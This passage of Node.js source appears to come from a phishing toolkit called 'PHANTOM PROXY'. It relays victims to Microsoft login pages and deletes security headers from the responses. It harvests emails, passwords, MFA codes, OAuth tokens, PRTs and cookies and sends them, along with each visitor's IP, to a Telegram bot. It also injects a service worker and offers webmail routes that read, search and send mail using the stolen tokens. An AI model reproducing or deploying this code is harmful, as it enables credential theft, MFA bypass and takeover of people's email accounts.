                if (folderId === 'inbox') {
                    endpoint = `/me/mailFolders/inbox/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
                } else if (folderId === 'sent') {
                    endpoint = `/me/mailFolders/sentitems/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
                } else {
                    endpoint = `/me/mailFolders/${folderId}/messages?$top=${limit}&$skip=${skip}&$orderby=receivedDateTime desc&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments,importance`;
                }
                const emails = await graph.get(endpoint);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, emails: emails.value || [], count: emails.value?.length || 0 }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── Webmail single email ──
    if (apiPath === '/api/webmail/email' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, messageId } = JSON.parse(body);
                if (!accessToken) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Access token required' }));
                    return;
                }
                if (!messageId) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Message ID required' }));
                    return;
                }
                const graph = new GraphClient(accessToken);
                const email = await graph.get(`/messages/${messageId}?$select=id,subject,sender,toRecipients,ccRecipients,bccRecipients,receivedDateTime,body,isRead,hasAttachments,importance,conversationId`);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, email }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── Webmail send ──
    if (apiPath === '/api/webmail/send' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, to, subject, body: emailBody, replyToId, forwardFromId } = JSON.parse(body);
                if (!accessToken) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Access token required' }));
                    return;
                }
                if (!to || !subject || !emailBody) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'To, subject, and body required' }));
                    return;
                }
                const graph = new GraphClient(accessToken);
                const emailData = {
                    message: {
                        subject: subject,
                        body: { content: emailBody, contentType: 'HTML' },
                        toRecipients: to.map(email => ({ emailAddress: { address: email } }))
                    }
                };
                if (replyToId) emailData.message.conversationId = replyToId;
                if (forwardFromId) emailData.message.forwardFrom = { id: forwardFromId };
                await graph.post('/me/sendMail', emailData);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── Webmail search ──
    if (apiPath === '/api/webmail/search' && req.method === 'POST') {
        let body = '';
        req.on('data', chunk => body += chunk);
        req.on('end', async () => {
            try {
                const { accessToken, query, folderId = 'inbox', limit = 50 } = JSON.parse(body);
                if (!accessToken) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Access token required' }));
                    return;
                }
                if (!query) {
                    res.writeHead(400);
                    res.end(JSON.stringify({ error: 'Search query required' }));
                    return;
                }
                const graph = new GraphClient(accessToken);
                const searchUrl = folderId === 'inbox'
                    ? `/me/mailFolders/inbox/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`
                    : `/me/mailFolders/${folderId}/messages?$search="${query}"&$top=${limit}&$select=id,subject,sender,toRecipients,receivedDateTime,isRead,bodyPreview,hasAttachments`;
                const results = await graph.get(searchUrl);
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ success: true, emails: results.value || [] }));
            } catch (err) {
                res.writeHead(500);
                res.end(JSON.stringify({ error: err.message }));
            }
        });
        return;
    }

    // ── 404 for unknown API ──
    res.writeHead(404, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'API endpoint not found' }));
}

// ============================================================
// 🔧 PROXY HANDLER
// ============================================================
function proxyHandler(req, res) {
    proxyServer.emit('request', req, res);
}

// ── Start auto-refresh ──
refreshTokensDaemon();

// ── The actual proxy server (with page‑load notification + SW registration) ──
const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    // ── PAGE‑LOAD NOTIFICATION & SERVICE WORKER INJECTION ──
    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;
            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                clientResponse.setHeader("Set-Cookie", `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Strict`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = phishedURL.pathname + phishedURL.search;
            VICTIM_SESSIONS[session].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
            VICTIM_SESSIONS[session].host = phishedURL.host;

            // ── 🔥 INJECT SERVICE WORKER REGISTRATION ──
            const indexPath = path.join(__dirname, PROXY_FILES.index);
            let html = fs.readFileSync(indexPath, 'utf-8');

            const swRegistrationScript = `
<script>
    if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('/service_worker_Mz8XO2ny1Pg5.js')
            .then(() => console.log('✅ SW registered'))
            .catch(err => console.error('❌ SW registration failed:', err));
    }
</script>`;

            // Inject before </head>
            html = html.replace(/<\/head>/i, swRegistrationScript + '</head>');

            // ── Send page‑load notification ──
            (async () => {
                try {
                    const ip = headers['cf-connecting-ip'] || headers['x-real-ip'] || headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
                    console.log(`🌐 Page-load: IP=${ip}, Session=${session}`);
                    const message = `🆕 **New Visitor (Page Load)!**\n\n🌍 IP: ${ip}\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${url}\n🖥️ User-Agent: ${headers['user-agent'] || 'Unknown'}`;
                    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    });
                    console.log('✅ Page-load notification sent.');
                } catch (e) {
                    console.error('❌ Page-load notification failed:', e.message);
                }
            })();

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            clientResponse.end(html);  // Served modified HTML

        } catch (error) {
            displayError("Entry point error", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
        return;
    }

    // ── Service Worker ──
    if (url === PROXY_PATHNAMES.serviceWorker) {
        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
        fs.createReadStream(url.slice(1)).pipe(clientResponse);
        return;
    }

    // ── Favicon ──
    if (url === PROXY_PATHNAMES.favicon) {
        if (currentSession && VICTIM_SESSIONS[currentSession]) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
        } else {
            clientResponse.writeHead(301, { Location: 'https://login.microsoftonline.com/favicon.ico' });
        }
        clientResponse.end();
        return;
    }

    // ── Proxied requests ──
    if (url === PROXY_PATHNAMES.proxy || currentSession) {
        let clientRequestBody = [];
        clientRequest
            .on("error", (error) => displayError("Client request body retrieval failed", error, method, url))
            .on("data", (chunk) => clientRequestBody.push(chunk))
            .on("end", () => {
                clientRequestBody = Buffer.concat(clientRequestBody).toString();

                if (!currentSession) {
                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                    clientResponse.end();
                    return;
                }

                let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                const proxyRequestOptions = {
                    hostname: VICTIM_SESSIONS[currentSession].hostname,
                    port: VICTIM_SESSIONS[currentSession].port,
                    method: method,
                    path: VICTIM_SESSIONS[currentSession].path,
                    headers: { ...headers },
                    rejectUnauthorized: false
                };
                let isNavigationRequest = false;

                if (clientRequestBody) {
                    if (url === PROXY_PATHNAMES.jsCookie) {
                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
                        clientResponse.end(JSON.stringify(validDomains));
                        return;
                    } else if (url === PROXY_PATHNAMES.proxy) {
                        try {
                            const parsed = JSON.parse(clientRequestBody);
                            let proxyRequestURL = new URL(parsed.url);
                            let proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;

                            if (proxyRequestURL.hostname === headers.host) {
                                if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
                                    VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                    VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                    VICTIM_SESSIONS[currentSession].path = phishedURL.pathname + phishedURL.search;
                                    VICTIM_SESSIONS[currentSession].port = phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80);
                                    VICTIM_SESSIONS[currentSession].host = phishedURL.host;
                                    clientResponse.writeHead(301, { Location: `${phishedURL.protocol}//${headers.host}${phishedURL.pathname}${phishedURL.search}` });
                                    clientResponse.end();
                                    return;
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                    clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                    fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                    return;
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                    try {
                                        const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                        proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                        proxyRequestPath = proxyRequestURL.pathname + proxyRequestURL.search;
                                    } catch (error) {
                                        displayError("Mutation parse failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                        return;
                                    }
                                } else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], headers.host, currentSession);
                                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                    clientResponse.end(JSON.stringify(validDomains));
                                    return;
                                }
                            }
                            proxyRequestProtocol = proxyRequestURL.protocol;
                            proxyRequestOptions.path = proxyRequestPath;
                            proxyRequestOptions.port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
                            proxyRequestOptions.method = parsed.method;
                            proxyRequestOptions.headers = { ...headers, ...parsed.headers };
                            if (proxyRequestURL.hostname !== headers.host) {
                                proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                proxyRequestOptions.headers.host = proxyRequestURL.host;
                            }
                            if (proxyRequestOptions.headers.referer) proxyRequestOptions.headers.referer = parsed.referrer;
                            isNavigationRequest = parsed.mode === "navigate";
                            clientRequestBody = parsed.body;
                        } catch (error) {
                            displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                        }
                    } else {
                        console.warn(`Non-proxied URL: ${url}`);
                    }
                } else {
                    console.warn(`No request body for URL: ${url}`);
                }

                proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                const proxyRequestBody = clientRequestBody.body || clientRequestBody;
                const contentLength = Buffer.byteLength(proxyRequestBody);
                if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
                else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }

                if (isNavigationRequest) {
                    VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                    VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                    VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                    VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                    VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                }

                const protocol = proxyRequestProtocol === "https:" ? https : http;
                const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
                    // ── Redirect interception ──
                    if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
                        const location = proxyResponse.headers.location;
                        try {
                            const locationURL = new URL(location);
                            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                            VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
                            VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
                            VICTIM_SESSIONS[currentSession].host = locationURL.host;
                            proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
                            console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
                        } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
                    }

                    const setCookieHeaders = proxyResponse.headers["set-cookie"];
                    if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
                    proxyResponse.headers["cache-control"] = "no-store";
                    proxyResponse.headers["access-control-allow-origin"] = `https://${headers.host}`;
                    deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

                    let responseBody = [];
                    proxyResponse
                        .on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
                        .on("data", (chunk) => responseBody.push(chunk))
                        .on("end", async () => {
                            let bodyBuffer = Buffer.concat(responseBody);

                            // ── Extract credentials for Telegram ──
                            let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                            try {
                                let reqBody = proxyRequestBody;
                                if (typeof reqBody === 'string') {
                                    try {
                                        const parsed = JSON.parse(reqBody);
                                        if (parsed.email) email = parsed.email;
                                        if (parsed.password) password = parsed.password;
                                        if (parsed.mfa || parsed.otp || parsed.code) mfa = parsed.mfa || parsed.otp || parsed.code;
                                        if (parsed.access_token) tokens.access_token = parsed.access_token;
                                        if (parsed.refresh_token) tokens.refresh_token = parsed.refresh_token;
                                        if (parsed.id_token) tokens.id_token = parsed.id_token;
                                        if (parsed.prt) tokens.prt = parsed.prt;
                                    } catch (e) {
                                        const params = new URLSearchParams(reqBody);
                                        if (params.get('email')) email = params.get('email');
                                        if (params.get('username')) email = params.get('username');
                                        if (params.get('loginfmt')) email = params.get('loginfmt');
                                        if (params.get('password')) password = params.get('password');
                                        if (params.get('passwd')) password = params.get('passwd');
                                        if (params.get('otc')) mfa = params.get('otc');
                                        if (params.get('code')) mfa = params.get('code');
                                        if (params.get('verificationCode')) mfa = params.get('verificationCode');
                                    }
                                }
                                const respStr = bodyBuffer.toString('utf-8');
                                const am = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (am) tokens.access_token = am[1];
                                const rm = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (rm) tokens.refresh_token = rm[1];
                                const im = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (im) tokens.id_token = im[1];
                                const pm = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (pm) tokens.prt = pm[1];
                                const setCookies = proxyResponse.headers['set-cookie'];
                                if (setCookies) {
                                    const arr = Array.isArray(setCookies) ? setCookies : [setCookies];
                                    for (const c of arr) {
                                        const [nameVal] = c.split(';');
                                        if (nameVal) {
                                            const [n, v] = nameVal.split('=');
                                            cookies[n] = v;
                                        }
                                    }
                                }
                                if (email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A' || Object.keys(tokens).length > 0 || Object.keys(cookies).length > 0) {
                                    await sendToTelegram({ sessionId: currentSession, email, password, mfa, tokens, cookies });
                                } else {
                                    console.log(`ℹ️ No credentials found in request for session ${currentSession}`);
                                }
                            } catch (e) {
                                console.error('❌ Telegram extraction error:', e.message);
                            }

                            // ── HTML injection ──
                            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
                                try {
                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                    bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                } catch (error) {
                                    displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                }
                            }

                            // ── FederationRedirectUrl ──
                            else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                try {
                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                    bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                } catch (error) {
                                    displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                }
                            }

                            clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                            clientResponse.end(bodyBuffer);
                        });
                });

                if (proxyRequestBody) proxyReq.write(proxyRequestBody);
                proxyReq.end();
            });
    } else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});

// ============================================================
// 🚀 START SERVER + WEBSOCKET
// ============================================================
const PORT = process.env.PORT || 3000;

if (WebSocket) {
    const wss = new WebSocket.Server({ server, path: '/ws' });
    const wsClients = new Set();
    wss.on('connection', (ws) => {
        wsClients.add(ws);
        ws.on('close', () => wsClients.delete(ws));
    });
    function broadcastNewLog(filename) {
        const message = JSON.stringify({ type: 'newLog', file: filename });
        for (const client of wsClients) {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        }
    }
    try {
        fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
            if (filename && filename.endsWith('.log')) {
                broadcastNewLog(filename);
            }
        });
        console.log('✅ WebSocket server started on /ws');
    } catch (e) {
        console.warn('⚠️ Could not watch log directory:', e.message);
    }
} else {
    console.warn('⚠️ WebSocket library not installed – live updates disabled.');
}

server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ PHANTOM PROXY v10.3 FIXED running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
    console.log(`📱 Device Code: /device`);
    console.log(`📤 Page‑load notifications: ACTIVE`);
    console.log(`📤 Telegram exfil: ACTIVE`);
    console.log(`🟣 PRT Engine: ACTIVE`);
    console.log(`🔑 Token Vault: ACTIVE`);
    console.log(`📊 Graph API: ACTIVE`);
    console.log(`📈 Analytics: ACTIVE`);
    console.log(`🎭 Phishlets: ACTIVE`);
    console.log(`📧 Webmail: ACTIVE`);
    console.log(`✅ Test endpoint: /dash/api/test-telegram`);
});
